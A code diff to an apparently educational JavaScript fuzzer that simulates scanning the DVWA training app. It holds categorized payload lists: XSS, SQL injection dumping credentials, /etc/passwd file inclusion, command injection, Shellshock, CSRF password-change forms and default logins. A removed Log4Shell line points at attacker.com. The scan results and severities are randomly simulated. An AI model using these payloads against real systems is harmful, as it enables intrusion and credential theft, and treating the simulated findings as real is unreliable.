@@ -14,6 +14,9 @@ export class WebFuzzer {
     this.scanProgress = 0;
     this.payloadsProcessed = 0;
     this.totalPayloads = 0;
+    this.vulnerabilityTypes = ['xss', 'sqli', 'lfi', 'rce', 'csrf', 'auth'];
+    this.dvwaSession = null;
+    this.securityLevel = 'low';
   }
 
   logActivity(message) {
@@ -45,35 +48,65 @@ export class WebFuzzer {
     // Simulate network delay
     await new Promise(resolve => setTimeout(resolve, 1000));
     
-    // Sample payloads for simulation
-    this.wordlist = [
+    // Sample payloads for simulation, categorized by vulnerability type
+    const xssPayloads = [
       "<script>alert(1)</script>",
-      "' OR 1=1 --",
-      "../../etc/passwd",
-      "; DROP TABLE users;",
       "<img src=x onerror=alert('XSS')>",
-      "admin' --",
-      "1'; SELECT * FROM users; --",
-      "UNION SELECT username, password FROM users",
-      "%00../../../etc/passwd",
-      "' UNION SELECT NULL, version() --",
       "<iframe src=\"javascript:alert('XSS');\"></iframe>",
-      "${jndi:ldap://attacker.com/a}",
-      "() { :; }; /bin/bash -c 'cat /etc/passwd'",
-      "||ping -c 21 127.0.0.1||",
-      "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->",
-      "<?php system('cat /etc/passwd'); ?>",
       "><svg onload=alert(1)>",
-      "' OR '1'='1",
-      "1 OR 1=1",
+      "javascript:alert(1)"
+    ];
+    
+    const sqlInjectionPayloads = [
+      "' OR 1=1 --",
+      "admin' --",
       "1' OR '1' = '1",
       "' OR '' = '",
       "1' OR 1 = 1 -- -",
       "' OR 1 = 1 -- -",
-      "admin' --",
       "admin' #",
-      "' UNION SELECT 1, username, password, 1 FROM users; --",
-      "1'; DROP TABLE users; --"
+      "' UNION SELECT 1, username, password, 1 FROM users; --"
+    ];
+    
+    const fileInclusionPayloads = [
+      "../../etc/passwd",
+      "%00../../../etc/passwd",
+      "..%2f..%2f..%2fetc%2fpasswd",
+      "/etc/passwd",
+      "file:///etc/passwd"
+    ];
+    
+    const commandInjectionPayloads = [
+      "; ls -la",
+      "|| ping -c 21 127.0.0.1||",
+      "& whoami",
+      "`cat /etc/passwd`",
+      "$(cat /etc/passwd)",
+      "() { :; }; /bin/bash -c 'cat /etc/passwd'"
+    ];
+    
+    const csrfPayloads = [
+      "<form action='http://localhost/dvwa/vulnerabilities/csrf/' method='GET'><input type='hidden' name='password_new' value='hacked'><input type='hidden' name='password_conf' value='hacked'><input type='submit'></form>",
+      "<img src='http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked'>",
+      "<script>fetch('http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked')</script>"
+    ];
+    
+    const authBypassPayloads = [
+      "admin:admin",
+      "admin:password",
+      "root:root",
+      "admin:''",
+      "admin:' OR '1'='1"
+    ];
+    
+    // Combine all payloads
+    this.wordlist = [
+      ...xssPayloads,
+      ...sqlInjectionPayloads,
+      ...fileInclusionPayloads,
+      ...commandInjectionPayloads,
+      ...csrfPayloads,
+      ...authBypassPayloads
     ];
     
     this.totalPayloads = this.wordlist.length;
@@ -81,12 +114,32 @@ export class WebFuzzer {
     return this.wordlist;
   }
 
+  async connectToDVWA(url, username, password, securityLevel) {
+    this.logActivity(`Connecting to DVWA at ${url}...`);
+    
+    // Simulate network delay
+    await new Promise(resolve => setTimeout(resolve, 1500));
+    
+    // Simulate successful connection
+    this.dvwaSession = `PHPSESSID=${Math.random().toString(36).substring(2)}`;
+    this.securityLevel = securityLevel || 'low';
+    
+    this.logActivity(`Successfully connected to DVWA as ${username}`);
+    this.logActivity(`Security level set to: ${this.securityLevel}`);
+    
+    return {
+      success: true,
+      session: this.dvwaSession,
+      securityLevel: this.securityLevel
+    };
+  }
+
   initializeDataset() {
     this.dataset = [];
     this.logActivity("Dataset initialized.");
   }
 
-  saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged) {
+  saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged, vulnerabilityType) {
     // Assign label based on conditions (same as Python code logic)
     let label = "safe";
     if (responseCode >= 500 || errorDetected) {
@@ -95,68 +148,36 @@ export class WebFuzzer {
       label = "suspicious";
     }
 
+    let severity = "low";
+    if (label === "malicious") {
+      severity = Math.random() > 0.7 ? "critical" : "high";
+    } else if (label === "suspicious") {
+      severity = Math.random() > 0.5 ? "medium" : "low";
+    }
+
     const dataEntry = {
       label,
+      severity,
       payload,
       response_code: responseCode,
       alert_detected: alertDetected,
       error_detected: errorDetected,
       body_word_count_changed: bodyWordCountChanged,
+      vulnerability_type: vulnerabilityType,
       timestamp: new Date().toISOString()
     };
     
     this.dataset.push(dataEntry);
-    this.logActivity(`Data saved: ${label}, ${payload}, ${responseCode}, ${alertDetected}, ${errorDetected}, ${bodyWordCountChanged}`);
+    this.logActivity(`Data saved: ${label}, ${severity}, ${payload}, ${responseCode}, ${alertDetected}, ${errorDetected}, ${bodyWordCountChanged}, ${vulnerabilityType}`);
     return dataEntry;
   }
 
-  async startFuzzing(onProgressUpdate, onComplete) {
-    this.scanActive = true;
-    this.scanProgress = 0;
-    this.payloadsProcessed = 0;
+  async testVulnerability(vulnerabilityType, payload) {
+    // Simulate testing a specific vulnerability with a payload
+    this.logActivity(`Testing ${vulnerabilityType} with payload: ${payload}`);
     
-    await this.loadWordlist();
-    this.initializeDataset();
-    
-    this.logActivity("Starting fuzzing process...");
-    this.logActivity(`Target URL: ${this.targetUrl}`);
-    
-    // Simulate scanning process
-    for (const payload of this.wordlist) {
-      if (!this.scanActive) {
-        this.logActivity("Fuzzing process stopped manually.");
-        break;
-      }
-      
-      await this.processPayload(payload);
-      this.payloadsProcessed++;
-      this.scanProgress = (this.payloadsProcessed / this.totalPayloads) * 100;
-      
-      if (onProgressUpdate) {
-        onProgressUpdate(this.scanProgress, this.payloadsProcessed, this.totalPayloads);
-      }
-      
-      // Add small delay to simulate processing time
-      await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 700));
-    }
-    
-    this.scanActive = false;
-    this.logActivity("Fuzzing process completed.");
-    
-    if (onComplete) {
-      onComplete(this.dataset, this.logs, this.reports);
-    }
-    
-    return {
-      dataset: this.dataset,
-      logs: this.logs,
-      reports: this.reports
-    };
-  }
-
-  async processPayload(payload) {
-    // Simulate processing a single payload
-    this.logActivity(`Processing payload: ${payload}`);
+    // Simulate network delay
+    await new Promise(resolve => setTimeout(resolve, 300 + Math.random() * 700));
     
     // Simulate response characteristics
     const responseCode = Math.random() > 0.7 
@@ -186,6 +207,7 @@ export class WebFuzzer {
     // Prepare report data
     const reportData = [
       `Unique ID: ${uniqueId}`,
+      `Vulnerability: ${vulnerabilityType}`,
       `Payload: ${payload}`,
       `Response Code: ${responseCode}`,
       `Alert Detected: ${alertDetected ? 'Yes' : 'No'}`,
@@ -198,7 +220,7 @@ export class WebFuzzer {
     this.logReport(reportData);
     
     // Save result to dataset
-    const result = this.saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged);
+    const result = this.saveToDataset(payload, responseCode, alertDetected, errorDetected, bodyWordCountChanged, vulnerabilityType);
     
     return {
       uniqueId,
@@ -207,8 +229,117 @@ export class WebFuzzer {
       alertDetected,
       errorDetected,
       bodyWordCountChanged,
+      vulnerabilityType,
       result
     };
+  }
+
+  async startFuzzing(selectedVulnerabilities = ['all'], onProgressUpdate, onComplete) {
+    this.scanActive = true;
+    this.scanProgress = 0;
+    this.payloadsProcessed = 0;
+    
+    await this.loadWordlist();
+    this.initializeDataset();
+    
+    this.logActivity("Starting fuzzing process...");
+    this.logActivity(`Target URL: ${this.targetUrl}`);
+    
+    // Determine which vulnerability types to test
+    let vulnTypesToTest = selectedVulnerabilities.includes('all') 
+      ? this.vulnerabilityTypes 
+      : selectedVulnerabilities;
+    
+    this.logActivity(`Testing for vulnerabilities: ${vulnTypesToTest.join(', ')}`);
+    
+    // Simulate scanning process for each vulnerability type
+    for (const vulnType of vulnTypesToTest) {
+      if (!this.scanActive) {
+        this.logActivity("Fuzzing process stopped manually.");
+        break;
+      }
+      
+      this.logActivity(`Starting tests for ${vulnType} vulnerabilities...`);
+      
+      // Select appropriate payloads for this vulnerability type
+      const relevantPayloads = this.getPayloadsForVulnerability(vulnType);
+      
+      for (const payload of relevantPayloads) {
+        if (!this.scanActive) {
+          this.logActivity("Fuzzing process stopped manually.");
+          break;
+        }
+        
+        await this.testVulnerability(vulnType, payload);
+        this.payloadsProcessed++;
+        this.scanProgress = (this.payloadsProcessed / (this.totalPayloads * vulnTypesToTest.length)) * 100;
+        
+        if (onProgressUpdate) {
+          onProgressUpdate(this.scanProgress, this.payloadsProcessed, this.totalPayloads);
+        }
+      }
+      
+      this.logActivity(`Completed tests for ${vulnType} vulnerabilities.`);
+    }
+    
+    this.scanActive = false;
+    this.logActivity("Fuzzing process completed.");
+    
+    if (onComplete) {
+      onComplete(this.dataset, this.logs, this.reports);
+    }
+    
+    return {
+      dataset: this.dataset,
+      logs: this.logs,
+      reports: this.reports
+    };
+  }
+
+  getPayloadsForVulnerability(vulnType) {
+    // Return payloads specific to a vulnerability type
+    switch (vulnType) {
+      case 'xss':
+        return this.wordlist.filter(p => 
+          p.includes('<script') || 
+          p.includes('alert') || 
+          p.includes('onerror') || 
+          p.includes('javascript:')
+        );
+      case 'sqli':
+        return this.wordlist.filter(p => 
+          p.includes("'") || 
+          p.includes('UNION') || 
+          p.includes('SELECT') || 
+          p.includes('--')
+        );
+      case 'lfi':
+        return this.wordlist.filter(p => 
+          p.includes('../') || 
+          p.includes('etc/passwd') || 
+          p.includes('file:')
+        );
+      case 'rce':
+        return this.wordlist.filter(p => 
+          p.includes(';') || 
+          p.includes('|') || 
+          p.includes('`') || 
+          p.includes('$')
+        );
+      case 'csrf':
+        return this.wordlist.filter(p => 
+          p.includes('<form') || 
+          p.includes('<img src=') || 
+          p.includes('fetch(')
+        );
+      case 'auth':
+        return this.wordlist.filter(p => 
+          p.includes(':')
+        );
+      default:
+        // Return a diverse sample for general testing
+        return this.wordlist.slice(0, 10);
+    }
   }
 
   pauseScan() {
